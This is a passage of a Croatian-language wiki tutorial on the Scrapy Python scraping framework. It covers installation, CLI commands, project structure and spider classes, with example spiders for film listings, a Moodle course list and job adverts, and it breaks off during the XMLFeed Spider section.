<!DOCTYPE html>
<html lang="hr" dir="ltr">
<head>
<meta charset="UTF-8" />
<title>Scrapy python framework - SIS Wiki</title>
<meta name="generator" content="MediaWiki 1.17.0" />
<link rel="shortcut icon" href="http://security.foi.hr/favicon.ico" />
<link rel="search" type="application/opensearchdescription+xml" href="../opensearch_desc.php" title="SIS Wiki (hr)" />
<link rel="EditURI" type="application/rsd+xml" href="../api.php%3Faction=rsd" />
<link title="Creative Commons" type="application/rdf+xml" href="http://security.foi.hr/wiki/index.php?title=Scrapy_python_framework&amp;action=creativecommons" rel="meta" />
<link rel="copyright" href="http://creativecommons.org/licenses/by-sa/3.0/" />
<link rel="alternate" type="application/atom+xml" title="SIS Wiki Atom izvor" href="../index.php%3Ftitle=Posebno:Nedavne_promjene&amp;feed=atom" />
<link rel="stylesheet" href="../load.php%3Fdebug=false&amp;lang=hr&amp;modules=mediawiki.legacy.commonPrint%252Cshared%257Cskins.vector&amp;only=styles&amp;skin=vector&amp;*.css" />
<meta name="ResourceLoaderDynamicStyles" content="" />
<!--[if lt IE 7]><style type="text/css">body{behavior:url("/wiki/skins/vector/csshover.min.htc")}</style><![endif]--></head>
<body class="mediawiki ltr ns-0 ns-subject page-Scrapy_python_framework skin-vector">
		<div id="mw-page-base" class="noprint"></div>
		<div id="mw-head-base" class="noprint"></div>
		<!-- content -->
		<div id="content">
			<a id="top"></a>
			<div id="mw-js-message" style="display:none;"></div>
						<!-- firstHeading -->
			<h1 id="firstHeading" class="firstHeading">Scrapy python framework</h1>
			<!-- /firstHeading -->
			<!-- bodyContent -->
			<div id="bodyContent">
				<!-- tagline -->
				<div id="siteSub">Izvor: SIS Wiki</div>
				<!-- /tagline -->
				<!-- subtitle -->
				<div id="contentSub"></div>
				<!-- /subtitle -->
																<!-- jumpto -->
				<div id="jump-to-nav">
					Skoči na: <a href="Scrapy_python_framework.html#mw-head">orijentacija</a>,
					<a href="Scrapy_python_framework.html#p-search">traži</a>
				</div>
				<!-- /jumpto -->
								<!-- bodytext -->
				<p>Matej Bašić
</p><p><br />
Scrapy je open-source aplikacijski razvojni okvir za vađenje i strukturiranje podataka iz web stranica te indeksiranje istih. Pisan je u Python programskom jeziku a podržava Linux, Windows, Mac i BSD operativne sustave. Primjena je široka, od rudarenja podacima do različitih vrsta testiranja i procesuiranja informacija.
</p><p><br />
</p>
<table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Sadržaj</h2></div>
<ul>
<li class="toclevel-1 tocsection-1"><a href="Scrapy_python_framework.html#Uvodni_primjer"><span class="tocnumber">1</span> <span class="toctext">Uvodni primjer</span></a></li>
<li class="toclevel-1 tocsection-2"><a href="Scrapy_python_framework.html#Instalacija"><span class="tocnumber">2</span> <span class="toctext">Instalacija</span></a></li>
<li class="toclevel-1 tocsection-3"><a href="Scrapy_python_framework.html#Osnove"><span class="tocnumber">3</span> <span class="toctext">Osnove</span></a>
<ul>
<li class="toclevel-2 tocsection-4"><a href="Scrapy_python_framework.html#Kreiranje_novog_projekta"><span class="tocnumber">3.1</span> <span class="toctext">Kreiranje novog projekta</span></a></li>
<li class="toclevel-2 tocsection-5"><a href="Scrapy_python_framework.html#Struktura_projekta"><span class="tocnumber">3.2</span> <span class="toctext">Struktura projekta</span></a></li>
<li class="toclevel-2 tocsection-6"><a href="Scrapy_python_framework.html#Kreiranje_novog_spidera"><span class="tocnumber">3.3</span> <span class="toctext">Kreiranje novog spidera</span></a></li>
<li class="toclevel-2 tocsection-7"><a href="Scrapy_python_framework.html#Pokretanje_spidera"><span class="tocnumber">3.4</span> <span class="toctext">Pokretanje spidera</span></a></li>
<li class="toclevel-2 tocsection-8"><a href="Scrapy_python_framework.html#Ispis_raspolo.C5.BEivih_spidera"><span class="tocnumber">3.5</span> <span class="toctext">Ispis raspoloživih spidera</span></a></li>
<li class="toclevel-2 tocsection-9"><a href="Scrapy_python_framework.html#Dohva.C4.87anje_URL-a"><span class="tocnumber">3.6</span> <span class="toctext">Dohvaćanje URL-a</span></a></li>
<li class="toclevel-2 tocsection-10"><a href="Scrapy_python_framework.html#Testiranje"><span class="tocnumber">3.7</span> <span class="toctext">Testiranje</span></a></li>
</ul>
</li>
<li class="toclevel-1 tocsection-11"><a href="Scrapy_python_framework.html#Spiders"><span class="tocnumber">4</span> <span class="toctext">Spiders</span></a>
<ul>
<li class="toclevel-2 tocsection-12"><a href="Scrapy_python_framework.html#Argumenti"><span class="tocnumber">4.1</span> <span class="toctext">Argumenti</span></a></li>
<li class="toclevel-2 tocsection-13"><a href="Scrapy_python_framework.html#Podklase"><span class="tocnumber">4.2</span> <span class="toctext">Podklase</span></a>
<ul>
<li class="toclevel-3 tocsection-14"><a href="Scrapy_python_framework.html#Spider"><span class="tocnumber">4.2.1</span> <span class="toctext">Spider</span></a>
<ul>
<li class="toclevel-4 tocsection-15"><a href="Scrapy_python_framework.html#Primjer"><span class="tocnumber">4.2.1.1</span> <span class="toctext">Primjer</span></a></li>
</ul>
</li>
<li class="toclevel-3 tocsection-16"><a href="Scrapy_python_framework.html#Crawl_Spider"><span class="tocnumber">4.2.2</span> <span class="toctext">Crawl Spider</span></a>
<ul>
<li class="toclevel-4 tocsection-17"><a href="Scrapy_python_framework.html#Primjer_2"><span class="tocnumber">4.2.2.1</span> <span class="toctext">Primjer</span></a></li>
</ul>
</li>
<li class="toclevel-3 tocsection-18"><a href="Scrapy_python_framework.html#XMLFeed_Spider"><span class="tocnumber">4.2.3</span> <span class="toctext">XMLFeed Spider</span></a>
<ul>
<li class="toclevel-4 tocsection-19"><a href="Scrapy_python_framework.html#Primjer_3"><span class="tocnumber">4.2.3.1</span> <span class="toctext">Primjer</span></a></li>
</ul>
</li>
<li class="toclevel-3 tocsection-20"><a href="Scrapy_python_framework.html#CSVFeedSpider"><span class="tocnumber">4.2.4</span> <span class="toctext">CSVFeedSpider</span></a></li>
<li class="toclevel-3 tocsection-21"><a href="Scrapy_python_framework.html#SitemapSpider"><span class="tocnumber">4.2.5</span> <span class="toctext">SitemapSpider</span></a></li>
</ul>
</li>
</ul>
</li>
<li class="toclevel-1 tocsection-22"><a href="Scrapy_python_framework.html#Selectors"><span class="tocnumber">5</span> <span class="toctext">Selectors</span></a>
<ul>
<li class="toclevel-2 tocsection-23"><a href="Scrapy_python_framework.html#SelectorList"><span class="tocnumber">5.1</span> <span class="toctext">SelectorList</span></a></li>
</ul>
</li>
<li class="toclevel-1 tocsection-24"><a href="Scrapy_python_framework.html#Items"><span class="tocnumber">6</span> <span class="toctext">Items</span></a>
<ul>
<li class="toclevel-2 tocsection-25"><a href="Scrapy_python_framework.html#Item_Pipeline"><span class="tocnumber">6.1</span> <span class="toctext">Item Pipeline</span></a></li>
</ul>
</li>
<li class="toclevel-1 tocsection-26"><a href="Scrapy_python_framework.html#Ostalo"><span class="tocnumber">7</span> <span class="toctext">Ostalo</span></a>
<ul>
<li class="toclevel-2 tocsection-27"><a href="Scrapy_python_framework.html#Dictionary_attack"><span class="tocnumber">7.1</span> <span class="toctext">Dictionary attack</span></a></li>
<li class="toclevel-2 tocsection-28"><a href="Scrapy_python_framework.html#Dictionary_scraper"><span class="tocnumber">7.2</span> <span class="toctext">Dictionary scraper</span></a></li>
</ul>
</li>
<li class="toclevel-1 tocsection-29"><a href="Scrapy_python_framework.html#Literatura"><span class="tocnumber">8</span> <span class="toctext">Literatura</span></a></li>
</ul>
</td></tr></table>
<h2> <span class="mw-headline" id="Uvodni_primjer"> Uvodni primjer </span></h2>
<p>Za demonstraciju jedan spider koji će prikupiti sve bolje naslove SF filmova od 2010. do danas. Za primjer ćemo koristiti tražilicu web stranice koja sadrži bogatu bazu a kako bi osigurali da se radi o kvalitetnijim filmovima, ograničiti ćemo donju granicu korisničkih ocjena na 8.0:<br />
</p><p><code>
</p>
<pre>.../search/title?count=100&amp;genres=sci_fi&amp;release_date=2010,2015&amp;title_type=tv_movie&amp;user_rating=8.0,10
</pre>
<p></code>
</p><p>Nakon <a href="Scrapy_python_framework.html#Instalacija">instalacije</a> Scrapy frameworka, spremni smo napraviti novi projekt sljedećim pozivom:<br />
</p><p><code> 
</p>
<pre>$ scrapy startproject sf_movies_simple
</pre>
<p></code>
</p><p>S novim projektom automatski se kreiraju potrebni <a href="Scrapy_python_framework.html#Struktura_projekta">direktoriji i datoteke</a>. Klasu kojom definiramo <i>spider</i> za naše potrebe sačuvati ćemo u datoteci <code>imdb_sf_spiders.py</code> u <code>sf_movies_simple</code> direktoriju:<br />
<code>
</p>
<pre>import scrapy
class MovieSfSpider(scrapy.Spider):
       name="movie_sf"
       allowed_domains=["site.com"]   
       start_urls=["http://www.site.com/search/title?count=100&amp;genres=sci_fi&amp;release_date=2010,2015&amp;title_type=tv_movie&amp;user_rating=8.0,10"]
       
       def parse(self, response):
                for el in response.xpath("//table[@class='results']//td[@class='title']"):
                       title = str(el.xpath("a/text()").extract().pop())
                       year = str(el.xpath("span[@class='year_type']/text()").re("\d+").pop())
                       rating = str(el.xpath("div[@class='user_rating']/div/span[@class='rating-rating']/span[@class='value']/text()").extract().pop())
                       print title, "(", year, ", ", rating, ")"
</pre>
<p></code><br />
Novokreirani <i>spider</i> sadrži atribut <code>name</code> jedinstvene vrijednosti koji koristimo prilikom pokretanja, <code>allowed_domains</code>, listu domena na kojima <i>spider</i> može prikupljati podatke, i <code>start_urls</code>, listu početnih URL-ova. Također definiramo <code>parse()</code> metodu u kojoj obrađujemo Response objekt za svaki definirani URL u <code>start_urls</code>. Ako pogledamo izvor obrađivane stranice možemo zamijetiti da se rezultati pretraživanja nalaze u tablici klase <code>'results'</code> i da se sve bitne informacije nalaze u ćelijama klase <code>'title'</code>. Iz svake od njih preuzeti ćemo naslov, godinu i korisničku ocjenu. Svaki poziv <code>xpath()</code> vraća SelectorList instancu na temelju proslijeđenog upita dok <code>extract()</code> vraća listu <i>unicode stringova</i> koju pohranjujemo u varijablu. Kod godine koristimo metodu <code>re()</code>. Naime, unutar <code>span</code> elementa klase <code>'year_type'</code> nalazi se godina i tip (npr. “(2013 TV Movie)“) stoga pomoću te metode koja za upit prima regularni izraz (eng. regular expression) filtriramo godinu. Također vraća listu <i>unicode stringova</i>.
Kreirani <i>spider</i> pokrećemo naredbom <code>scrapy crawl spider_name</code>:
<code>
</p>
<pre>$ scrapy crawl movie_sf
</pre>
<p></code>
Te u terminalu dobivamo sljedeći rezultat:
<code>
</p>
<pre>...
[imdb_sf] DEBUG: Crawled (200) &lt;GET http://www.site.com/search/title?count=100&amp;genres=sci_fi&amp;release_date=2010,2015
 &amp;title_type=tv_movie&amp;user_rating=8.0,10&gt; (referer: None)
The Selection ( 2013 , 8.5 )
Robot Chicken: Star Wars Episode III ( 2010 , 8.1 )
Vastra Investigates ( 2012 , 8.1 )
The Sixth Gun ( 2013 , 8.2 )
D-TEC: Pilot ( 2013 , 8.7 )
Ghosts/Aliens ( 2010 , 8.7 )
The Rusty Bucket Kids: Lincoln, Journey to 16 ( 2010 , 8.9 )
Advent ( 2011 , 8.2 )
Araneum ( 2010 , 8.5 )
Quest for the Indie Tube ( 2011 , 8.0 )
Before: Zombie Etiquette ( 2011 , 9.1 )
3% ( 2011 , 8.1 )
Bezci ( 2014 , 8.2 )
[imdb_sf] INFO: Closing spider (finished)
...
</pre>
<p></code>
Ako želimo rezultate pohraniti, moramo prvo kreirati <a href="Scrapy_python_framework.html#Items">Item klasu</a> u <code>items.py</code> datoteci koja se automatski kreira prilikom postavljanja projekta a nalazi se u korijenskom direktoriju projekta. Unutar te klase definiramo atribute kao <code>scrapy.Field</code> objekte:
<code>
</p>
<pre>import scrapy
class SfMovieItem(scrapy.Item):
       title = scrapy.Field()
       year = scrapy.Field()
       rating = scrapy.Field()
</pre>
<p></code>
Kako bi svaki rezultat pohranili kao <code>SfMovieItem</code>, moramo ažurirati i <code>imdb_sf_spider.py</code>:
<code>
</p>
<pre>import scrapy
from sf_movies_simple.items import SfMovieItem
class MovieSfSpider(scrapy.Spider):
       name="movie_sf"
       allowed_domains=["site.com"]     
       start_urls=["http://www.site.com/search/title?count=100&amp;genres=sci_fi&amp;release_date=2010,2015&amp;title_type=tv_movie&amp;user_rating=8.0,10"]
       
       def parse(self, response):
               for el in response.xpath("//table[@class='results']//td[@class='title']"):
                       item = SfMovieItem()
                       item['title'] = el.xpath("a/text()").extract()
                       item['year'] = el.xpath("span[@class='year_type']/text()").re("\d+")
                       item['rating'] = el.xpath("div[@class='user_rating']/div/span[@class='rating-rating']/span[@class='value']/text()").extract()
                       yield item
</pre>
<p></code>
Kako bi opet pokrenuli spider i sačuvali rezultate u npr. <code>movies.json</code> datoteci pozivamo sljedeću naredbu:
<code>
</p>
<pre>$ scrapy crawl movie_sf -o movies.json
</pre>
<p></code>
Sada iste rezultate imamo pohranjene u datoteci <code>movies.json</code> u korijenskom direktoriju projekta. <br />
Detaljnije o razvojnom okviru u sljedećim poglavljima.
</p><p><br />
</p>
<h2> <span class="mw-headline" id="Instalacija"> Instalacija </span></h2>
<p>Preduvjeti za instalaciju Scrapy Python razvojnog okvira (v0.24.0) su sljedeći:<br />
</p>
<ul><li> Python v2.7
</li><li> lxml
</li><li> OpenSSL
</li><li> pip i setuptools Python paketi
</li></ul>
<p>Nakon zadovoljavanja preduvjeta, Scrapy instaliramo sljedećim pozivom:
<code>
</p>
<pre>$ pip install Scrapy
</pre>
<p></code>
Ukoliko koristimo Windows OS, potreban nam je i <a href="http://sourceforge.net/projects/pywin32/" class="external text" rel="nofollow">pywin32 (Python for Windows Extensions)</a>.
</p>
<h2> <span class="mw-headline" id="Osnove"> Osnove </span></h2>
<p>Sa Scrapy razvojnim okvirom uglavnom upravljamo preko alata naredbene linije (eng. command-line tool) naredbom <code>scrapy</code>. Naredba se sastoji od nekoliko opcija a neke od njih možemo koristiti i izvan projekta. Popis raspoloživih opcija možemo vidjeti pozivom naredbe <code>scrapy</code>:
<code>
</p>
<pre>$ scrapy
Scrapy 0.24.4 - project: sf_movies_simple
Usage:
  scrapy &lt;command&gt; [options] [args]
Available commands:
  bench         Run quick benchmark test
  check         Check spider contracts
  crawl         Run a spider
  deploy        Deploy project in Scrapyd target
  edit          Edit spider
  fetch         Fetch a URL using the Scrapy downloader
  genspider     Generate new spider using pre-defined templates
  list          List available spiders
  parse         Parse URL (using its spider) and print the results
  runspider     Run a self-contained spider (without creating a project)
  settings      Get settings values
  shell         Interactive scraping console
  startproject  Create new project
  version       Print Scrapy version
  view          Open URL in browser, as seen by Scrapy
</pre>
<p></code>
</p>
<h3> <span class="mw-headline" id="Kreiranje_novog_projekta"> Kreiranje novog projekta </span></h3>
<p>U uvodnom primjeru već smo pokazali korištenje opcije <code>startproject</code> kojom kreiramo novi projekt i sve pripadajuće datoteke i direktorije:
<code>
</p>
<pre>$ scrapy startproject project_name
</pre>
<p></code>
</p>
<h3> <span class="mw-headline" id="Struktura_projekta"> Struktura projekta </span></h3>
<p><code>
</p>
<pre>scrapy.cfg – konfiguracijska datoteka projekta
project_name/ - python modul projekta
   __init__.py
   items.py – datoteka u kojoj definiramo Item objekte
   pipelines.py  - datoteka u kojoj definiramo Pipeline objekte
   settings.py – postavke porokejta
   spiders/ - direktorij u kojem pohranjujemo spidere
      __init__.py
      spider_name.py – datoteka u kojoj definiramo spider
</pre>
<p></code>
</p>
<h3> <span class="mw-headline" id="Kreiranje_novog_spidera"> Kreiranje novog <i>spidera</i> </span></h3>
<p>Osim što novi <i>spider</i> možemo kreirati "ručno", kreiranjem nove datoteke u <code>spiders</code> direktoriju, također ih možemo kreirati pozivom <code>scrapy genspider</code> naredbe:
<code>
</p>
<pre>scrapy genspider [-t template] &lt;name&gt; &lt;domain&gt;
</pre>
<p></code>
Scrapy podržava više <a href="Scrapy_python_framework.html#Podklase">vrsta <i>spidera</i></a> te za svaki od njih postoji predložak. Podržane vrste možemo doznati sljedećim pozivom:
<code>
</p>
<pre>$ scrapy genspider -l
Available templates:
  basic
  crawl
  csvfeed
  xmlfeed
</pre>
<p></code>
Primjer kreiranja osnovnog <i>spidera</i>:
<code>
</p>
<pre>$ scrapy genspider –t basic basic_spider google.hr
</pre>
<p></code>
Kreirane <i>spidere</i> možemo ažurirati naredbom <code>scrapy edit spider_name</code>.
</p>
<h3> <span class="mw-headline" id="Pokretanje_spidera"> Pokretanje spidera </span></h3>
<p>Već smo u uvodnom primjeru pokazali naredbu <code>crawl</code> koja se može koristiti samo unutar projekta:
<code>
</p>
<pre>$ scrapy crawl spider_name
</pre>
<p></code>
<i>Spider</i> možemo pokrenuti i izvan projekta:
<code>
</p>
<pre>$ scrapy runspider spider_name.py
</pre>
<p></code>
</p>
<h3> <span class="mw-headline" id="Ispis_raspolo.C5.BEivih_spidera"> Ispis raspoloživih spidera </span></h3>
<p>Naredbom <code>scrapy list</code> ispisujemo sve raspoložive spidera unutar projekta.
</p>
<h3> <span class="mw-headline" id="Dohva.C4.87anje_URL-a"> Dohvaćanje URL-a </span></h3>
<p>Sljedećom naredbom dohvaćamo definirani URL i ispisujemo HTML sadržaj istog:
<code>
</p>
<pre>$ scrapy fetch http://www.google.hr
</pre>
<p></code>
Naime HTML koji Scrapy skida ne mora biti isti kao i onaj kojeg možemo vidjeti u web pregledniku jer često sami preglednici dodaju određene HTML elemente i Scrapy također ne izvršava JavaScript kod. Ako naredbu koristimo unutar projekta možemo definirati i koji spider da koristimo:
<code> 
</p>
<pre>$ scrapy fetch –spider=spider_name http://www.google.hr
</pre>
<p></code>
</p>
<h3> <span class="mw-headline" id="Testiranje"> Testiranje </span></h3>
<p>Ukoliko želimo testirani određeni URL bez pokretanja <i>spidera</i>, to možemo učinit pomoću interaktivne ljuske:
<code>
</p>
<pre>$ scrapy shell http://www.google.hr
</pre>
<p></code>
Ljuska je zapravo regularna Python konzola s par mogućnosti koje nam pomažu u radu sa Scrapyem. Pozivanjem <code>shelp()</code> metode ispisujemo te dodatne metode i objekte:
<code>
</p>
<pre>In [1]: shelp()
[s] Available Scrapy objects:
[s]   crawler    &lt;scrapy.crawler.Crawler object at 0x7fcf4bb5a290&gt;
[s]   item       {}
[s]   request    &lt;GET http://www.google.hr&gt;
[s]   response   &lt;200 http://www.google.hr&gt;
[s]   settings   &lt;scrapy.settings.Settings object at 0x7fcf511c7450&gt;
[s]   spider     &lt;Spider 'default' at 0x7fcf4fab8590&gt;
[s] Useful shortcuts:
[s]   shelp()           Shell help (print this help)
[s]   fetch(req_or_url) Fetch request (or URL) and update local objects
[s]   view(response)    View response in a browser
</pre>
<p></code>
Iz prethodnog ispisa možemo vidjeti da se u ljusci automatski kreiraju Request i Response objekti na koje možemo testirati npr. <i>XPath</i> upite:
<code>
</p>
<pre>In [6]: response.xpath("//a[@id='gb_70']").extract()
Out[6]: [u'&lt;a target="_top" id="gb_70" href="https://accounts.google.com/ServiceLogin?hl=hr&amp;continue=http://www.google.hr/" class="gb4"&gt;Prijavite  se&lt;/a&gt;']
</pre>
<p></code>
Ili ispisati HTTP header polja: 
<code>
</p>
<pre>In [13]: request.headers
Out[13]:
{'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
 'Accept-Encoding': 'gzip,deflate',
 'Accept-Language': 'en',
 'User-Agent': 'Scrapy/0.24.4 (+http://scrapy.org)'}
</pre>
<p></code>
Za izlaz iz ljuske koristi se Ctrl+D prečac.
XPath upite također možemo testirati i pomoću Firefox preglednika odnosno njegovog <a href="https://getfirebug.com/wiki/index.php/$x" class="external text" rel="nofollow">Firebug dodatka</a>.
</p>
<h2> <span class="mw-headline" id="Spiders"> Spiders </span></h2>
<p>U Scrapy razvojnom okviru <i>spideri</i> su klase koje definiraju kako će se određena stranica odnosno stranice obrađivati. Skidanje, obrada i pohranjivanje stranica obično slijede slijedeće korake:
</p>
<ul><li> Generiranje inicijalnih Request objekata za definirane URL-ove u start_urls atributu
</li><li> U <i>callback</i> metodi (obično <code>parse</code>) obrađuje se dobiveni Response objekt i vraća <a href="Scrapy_python_framework.html#Items">Item</a>, novi Request ili oboje
</li><li> Vraćeni <a href="Scrapy_python_framework.html#Items">Item</a> objekti pohranjuju se u datoteku ili bazu podataka
</li></ul>
<h3> <span class="mw-headline" id="Argumenti"> Argumenti </span></h3>
<p>Spider također može primiti i argumente putem <code>scrapy crawl</code> naredbe:
<code>
</p>
<pre>scrapy crawl spider_name –a arg_name=arg_value
</pre>
<p></code>
U primjeru iz uvoda uvesti ćemo četiri nova argumenta:
<code> 
</p>
<pre>$ scrapy crawl movie_sf -o movies.json -a r_date_start=2008 -a r_date_end=2012 -a u_rating_min=6.0 -a u_rating_max=9.5
</pre>
<p></code>
A da bi to radilo trebamo ažurirati i <i>spider</i>:
<code>
</p>
<pre>...
class MovieSfSpider(scrapy.Spider):
       name="movie_sf"
       allowed_domains=["site.com"]
       def __init__(self, r_date_start = 2010, r_date_end = 2015, u_rating_min = 8.0, u_rating_max = 10, *args, **kwargs):
               super(MovieSfSpider, self).__init__(*args, **kwargs)
               self.start_urls=["http://www.site.com/search/title?count=100&amp;genres=sci_fi&amp;release_date=%s,%s&amp;title_type=tv_movie&amp;user_rating=%s,%s"  
</pre>
<p>% (r_date_start, r_date_end, u_rating_min, u_rating_max)]
</p>
<pre>       def parse(self, response):
...
</pre>
<p></code>
</p>
<h3> <span class="mw-headline" id="Podklase"> Podklase </span></h3>
<p>Spomenuli smo da Scrapy podržava više podvrsta <i>spidera</i>. Njihov cilj je pružiti određene funkcionalnosti za specifične slučajeve kao obradu XML-a, Sitemapa i slično.
</p>
<h4> <span class="mw-headline" id="Spider"> Spider </span></h4>
<p>Najjednostavnija i osnovna verzija <i>spidera</i> koju nasljeđuju sve ostale. Ne sadrži posebne funkcionalnosti, a većina atributa i metoda spomenuta je i prije.
</p><p><b>Atributi</b>:
</p>
<ul><li> <code>name</code>: string, obavezno; jedinstveno ime <i>spidera</i>, koristi se za lociranje i instanciranje
</li><li> <code>allowed_domains</code>: string list, opcionalno;  sadrži listu domena koju <i>spider</i> može obrađivati
</li><li> <code>start_urls</code>: string list, opcionalno; lista početnih URL-ova
</li></ul>
<p><b>Metode</b>:
</p>
<ul><li> <code>start_requests()</code>: poziva se kada nisu definirani URL-ovi u <code>start_urls</code> atributu. U suprotnome poziva se <code>make_requests_from_url()</code> metoda. Vraća listu Request objekata.
</li><li> <code>make_requests_from_url(url)</code>: Služi za konvertiranje URL-ova u Request objekt. Kao argument prima URL(string) te vraća Request objekt
</li><li> <code>parse(response)</code>: služi za obradu preuzetog Response objekta. Vraća Request objekte i/ili Item objekte
</li><li> <code>log(msg [, level, component])</code>: ispis poruke 
</li><li> <code>closed(reason)</code>: poziva se prije zatvaranja spidera
</li></ul>
<h5> <span class="mw-headline" id="Primjer"> Primjer </span></h5>
<p>U ovom primjeru koristimo Scrapy za ispis kolegija sa sustava za e-učenje Moodle. U primjeru je korištena spomenuta <code>start_requests()</code> metoda koja vraća Request objekt (isto bi dobili korištenje atributa <code>start_urls</code>, metoda je ovdje čisto zbog demonstracije). <code>parse()</code> metoda vraća posebnu vrstu Request objekta, FormRequest, s korisničkim imenom i lozinkom te u metodi <code>after_login()</code> obrađuje se početna stranica sustava e-učenja ako je prijava uspješna.
<code>
</p>
<pre>import scrapy
from scrapy import log

class MoodleNewsSpider(scrapy.Spider):
       		name = "moodle_news"
       		def start_requests(self):
               		return [scrapy.Request(url='https://login.moodle.hr/login/index.php')]

                       def parse(self, response):
               		self.log("Loggin in...", level=log.INFO)
               		return scrapy.FormRequest.from_response(
                       			response,
                       			formdata={ 'username'&#160;: 'user' , 'password'&#160;: 'pass' },
                       			callback=self.after_login
               		)

       		def after_login(self, response):
               		#print response.body
               		if "Moja naslovnica" in response.body:
                  	     		self.log("Login successful", level=log.INFO)
                       			for sel in response.xpath("//div[@class='course_list']/div[@class='box coursebox']"):
                               			print sel.css("h2").xpath("child::a//text()").extract()
                       			return
               		else:
                       			self.log("Login failed", level=log.ERROR)
                       			return
</pre>
<p></code>
</p>
<h4> <span class="mw-headline" id="Crawl_Spider"> Crawl Spider </span></h4>
<p>Često korišten za obradu regularnih web stranica jer pruža mehanizme za praćenje poveznica na temelju definiranih pravila. Osim atributa i metoda koje nasljeđuje od Spider klase, sadrži sljedeće:
</p><p><b>Atributi</b>:
</p>
<ul><li> <code>rules</code>: lista <code>Rule</code> objekata. Svaki <code>Rule</code> objekt definira određenu proceduru za obradu stranice.
</li></ul>
<p><b>Metode</b>:
</p>
<ul><li> <code>parse_start_url(response)</code>: poziva se za sve definirane URL-ove u <code>start_urls</code> atributu. Vraća Item, Request ili oboje
</li></ul>
<h5> <span class="mw-headline" id="Primjer_2"> Primjer </span></h5>
<p>U ovom primjeru prikupljaju se svi poslovi IT kategorije (category=11) s portala moj-posao.net. U atributu <code>rules</code> definirali smo pravilo da pratimo samo poveznice koje sadrže '/Posao/'. S tih stranica vadi se naziv posla, pozicija, lokacija te spomenuti jezici odnosno tehnolgije i poslodavac, ako postoje. 
<code>
</p>
<pre>import scrapy
from scrapy.contrib.linkextractors import LinkExtractor
from scrapy.contrib.spiders import CrawlSpider, Rule
import json
from mojposao.items import MojposaoItem

class ItPosloviSpider(CrawlSpider):
	name = 'it_poslovi'
	allowed_domains = ['moj-posao.net']
	file = "stranice.json"
	comp_data = " "	
	rules = [Rule(LinkExtractor(allow='/Posao/'), callback="parse_item")]	
	
	def __init__(self, *args, **kwargs):
		# pohrana liste jezika u comp_data
               # pohrana proslijedjenih linkova u start_urls atributu	
	
	def add_lang(self, job, lang):
		lang = lang.strip()
		if lang&#160;!= "":
			if bool(job['langs']) == False:
				job['langs'] = lang
			else:	 
                		job['langs'] += ", " + lang                 
						
	def parse_item(self, response):
		print "parse_item"
		job = MojposaoItem()
	
		temp =  response.xpath("//section[@id='page-title']/h1/span/text()").extract().pop().encode('utf-8').rsplit(" - ", 1)
		job['title'] = temp[0].strip()
		job['location'] = temp[1].strip()
		job['langs'] = ""

		employerTemp = response.xpath("//div[@id='employer']/ul/li/strong/text()").extract()
		if (employerTemp):
			job['employer'] = employerTemp.pop().encode('utf-8')

		body = response.xpath("//section[@id='job-detail']/descendant::*/text()").extract()
		job_txt = ""
		for el in body:
			job_txt += el
		job_txt = job_txt.upper().replace(",", " ").replace(".", " ").replace(";", " ")
		
		for item in self.comp_data:
			if item['t'] in job_txt:
				self.add_lang(job, item['t'])
			
			elif "alt" in item and item['alt'] in job_txt:
				self.add_lang(job, item['t'])
		
		yield job

</pre>
<p></code>
</p><p>Prikazani <i>spider</i> poziva se iz drugog <i>spidera</i> koji dohvaća sve URL-ove stranica na kojima se nalaze oglasi.
<code>
</p>
<pre>import scrapy
from scrapy.exceptions import CloseSpider
from scrapy.xlib.pydispatch import dispatcher
from scrapy import signals
from scrapy.settings import Settings

from mojposao.spiders.it_poslovi import ItPosloviSpider
from mojposao.items import UrlItem

class ItStraniceSpider(scrapy.Spider):
	name = 'it_stranice'
	allowed_domains = ['moj-posao.net']
	start_urls = ['http://www.moj-posao.net/Pretraga-Poslova/?category=11']
	
	def __init__(self, *args, **kwargs):
		super(ItStraniceSpider, self).__init__(*args, **kwargs)
		dispatcher.connect(self.spider_closed, signals.spider_closed)
     
	def parse(self, response):
		...
	
	def spider_closed(self, spider):
		crawler = Crawler(Settings())
		crawler.configure()
		crawler.crawl(ItPosloviSpider())
		crawler.start()
</pre>
<p></code>
</p><p>Rezultat:
<code>
</p>
<pre>&lt;items&gt;
   ...
   &lt;item&gt;
      &lt;langs&gt;&lt;/langs&gt;
      &lt;employer&gt;AZTEK, d.o.o. za projektiranje, savjetovanje i usluge&lt;/employer&gt;
      &lt;location&gt;Zagreb&lt;/location&gt;
      &lt;title&gt;Projektant telekomunikacijskih sustava, elektroinstalacija i tehničke zaštite (m/ž)&lt;/title&gt;
   &lt;/item&gt;
   &lt;item&gt;
      &lt;langs&gt;JAVASCRIPT, JAVA, HTML, CSS, PLSQL, SQL&lt;/langs&gt;
      &lt;employer&gt;DEKOD d.o.o.&lt;/employer&gt;
      &lt;location&gt;Koprivnica, Zagreb&lt;/location&gt;
      &lt;title&gt;Programer / projektant (m/ž)&lt;/title&gt;
   &lt;/item&gt;
   &lt;item&gt;
      &lt;langs&gt;C#, JAVASCRIPT, PHP, ASP, HTML, CSS, PYTHON, RUBY&lt;/langs&gt;
      &lt;employer&gt;STATIM d.o.o. za računalne djelatnosti i usluge&lt;/employer&gt;
      &lt;location&gt;Split&lt;/location&gt;
      &lt;title&gt;Web developer (m/ž)&lt;/title&gt;
   &lt;/item&gt;
   ...
&lt;/items&gt;
</pre>
<p></code>
</p>
<h4> <span class="mw-headline" id="XMLFeed_Spider"> XMLFeed Spider </span></h4>
<p>Dizajniran za obradu XML datoteka iterirajući kroz njih na temelju određenog imena čvora odnosno elementa. Za to možemo koristiti jedan od tri iteratora: <code>iternodes</code>, <code>xml</code> i <code>html</code>. Prepruča se prvi jer ostala dva generiraju cijeli DOM prije obrade, ali u slučaju grešaka u XML datoteci, preporuča se <code>html</code>.
</p><p><b>Atributi</b>:
</p>
<ul><li> <code>iterator</code>: string; definira koji se iterator koristi. <code>iternodes</code> je najbrži, bazira se na regularnim izrazima, dok <code>html</code> i <code>xml</code> koriste <a href="Scrapy_python_framework.html#Selectors">Selectore</a> i prije obrade generiraju cijeli DOM što može biti sporo za veće datoteke
</li><li> <code>itertag</code>: string; ime glavnog čvora po kojem iteriramo
</li><li> <code>namespace</code>: list(prefix, url); definira <code>namespace</code> raspoloživ u dokumentu koji će se koristiti u <i>spideru</i>
</li></ul>
<p><b>Metode</b>:
</p>
<ul><li> <code>adapt_response(response)</code>: koristi se za modifikaciju Response objekta prije samog parsiranja. Vraća također Response objekt.
